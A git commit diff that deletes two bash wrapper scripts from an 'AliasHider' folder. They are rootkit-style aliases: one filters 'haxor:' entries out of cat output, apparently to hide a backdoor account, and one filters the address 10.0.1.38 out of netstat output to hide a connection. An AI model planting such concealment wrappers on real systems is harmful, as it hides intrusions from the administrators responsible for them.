80bb1770d2fd9dfc1054f59c9b6f41b60a3acd34
ski aka sk <ski@countermail.com>
2012-02-06 20:42:48 -0800

    Removed artifacts

--- AliasHider/cat.bash
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-_cat() {
-    cat $1 | sed -e '/haxor:/d' | sed -e '/BLAH.....:/d'
-}
-
-_cat $1
--- AliasHider/netstat.bash
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-_netstat() {
-        netstat $1 | sed '/10.0.1.38/d'
-}
-
-_netstat $1
